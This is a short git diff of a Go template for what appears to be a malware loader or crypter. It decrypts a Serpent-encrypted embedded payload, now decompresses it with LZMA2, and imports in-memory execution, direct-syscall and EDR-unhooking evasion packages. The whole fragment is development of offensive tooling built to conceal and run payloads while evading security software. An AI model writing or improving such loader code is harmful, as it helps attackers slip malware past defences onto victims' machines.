@@ -11,12 +11,13 @@ import (
 
 	//{{if .Debug}}
 	"os/exec"
+
+	"github.com/coremedic/goldr/pkg/syscalls"
+
 	//{{end}}
 
 	"github.com/amenzhinsky/go-memexec"
 	//{{end}}
-
-	"github.com/coremedic/goldr/pkg/syscalls"
 
 	//{{if .Unhook}}
 	"github.com/coremedic/goldr/pkg/evasion"
@@ -59,10 +60,16 @@ func main() {
 	//{{end}}
 
 	//{{if .Spawn}}
-	bin, err := crypter.SerpentDecrypt(cryptbin, key)
+	dBin, err := crypter.SerpentDecrypt(cryptbin, key)
 	if err != nil {
 		//{{if .Debug}}
 		log.Printf("Failed to decrpyt payload: %s\n", err.Error())
+		//{{end}}
+		return
+	}
+	bin, err := crypter.DecompressLZMA2(dBin)
+	if err != nil {
+		//{{if .Debug}}
 		//{{end}}
 		return
 	}
